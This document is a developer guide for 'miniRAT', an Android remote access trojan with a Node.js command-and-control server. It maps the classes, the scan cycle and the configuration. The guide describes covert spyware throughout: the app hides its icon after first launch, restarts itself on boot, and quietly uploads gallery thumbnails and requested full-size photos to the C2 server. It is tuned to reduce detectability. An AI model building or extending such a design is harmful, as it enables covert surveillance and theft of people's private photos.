# Project Context — miniRAT

> Developer guide: conventions, codebase navigation, setup, and key design decisions.

---

## Codebase Map

```
com.app.minirat/
├── HiddenActivity.java         # [ENTRY] Permission → service → hide → finish
├── Service.java                # [CORE] Lifecycle + scan scheduling
├── GalleryScanner.java         # [DATA] MediaStore queries + image processing
├── NetworkManager.java         # [NET] All HTTP communication
├── UploadTracker.java          # [STATE] SharedPreferences deduplication
├── MediaItem.java              # [MODEL] Data class (id, uri, name)
└── BootReceiver.java           # [PERSIST] Restart on boot

server.js                       # C2: routes + dashboard + request queue
```

---

## Key Design Decisions

| Decision | Rationale |
|---|---|
| **5-class refactor** | Single responsibility; Service.java orchestrates, delegates all work |
| **Request queue** | On-demand full images without pre-uploading everything |
| **Periodic 15-min scan** | Catches new photos; retries when server comes online |
| **Server ping before scan** | No wasted battery when server is down |
| **SharedPreferences dedup** | Survives process restarts; prevents re-uploads |
| **Break on first failure** | Partial scan success preserved; rest retried next cycle |
| **Single background thread** | Sequential processing prevents OOM and reduces detectability |
| **Per-cycle WakeLock** | Only active during scan; released immediately after |
| **50MB JSON limit** | Full-res images need larger payload allowance |
| **Request file persistence** | `requests.json` survives server restarts |

---

## Scan Cycle Flow

```
Service.runScanCycle()
├── network.isServerReachable()  → HEAD /api/thumbnails
├── uploadNewThumbnails()
│   ├── scanner.getAllImages()    → MediaStore query
│   ├── tracker.isUploaded(id)   → SharedPreferences check
│   ├── scanner.createThumbnail  → decode → scale → JPEG → Base64
│   ├── network.uploadThumbnail  → POST /api/upload/thumbnail
│   └── tracker.markAsUploaded   → persist ID
└── fulfillFullImageRequests()
    ├── network.getPendingRequests() → GET /api/requests
    ├── scanner.findByName()     → MediaStore query by name
    ├── scanner.readFullImage()  → decode → JPEG 90% → Base64
    ├── network.uploadFullImage  → POST /api/upload/fullsize
    └── network.markRequestFulfilled → DELETE /api/request/:file
```

---

## Configuration

| Property | Location | Value |
|---|---|---|
| `DOMAIN_URL` | `app/local.properties` | C2 server URL |
| Port | `server.js` | `5000` |
| Scan interval | `Service.java` | `15 * 60 * 1000L` ms |
| Thumbnail size | `GalleryScanner.java` | `128×128` px |
| Thumbnail quality | `GalleryScanner.java` | JPEG `70%` |
| Full image quality | `GalleryScanner.java` | JPEG `90%` |
| JSON limit | `server.js` | `50mb` |

---

## Gotchas

1. **First launch required** — Must open app once for permissions and boot receiver
2. **Permission denial** — MediaStore returns 0 results silently
3. **App icon gone** — After first launch, only reinstall can re-trigger
4. **SharedPreferences limit** — StringSet fine up to ~50K IDs; beyond that use SQLite
5. **Full image memory** — `readFullImage()` loads full bitmap into RAM; very large images could OOM
6. **Request queue persistence** — `requests.json` is on server disk; survives restarts
7. **Full image uploads** — Can be 5-10 MB each; ensure `express.json({ limit })` is sufficient
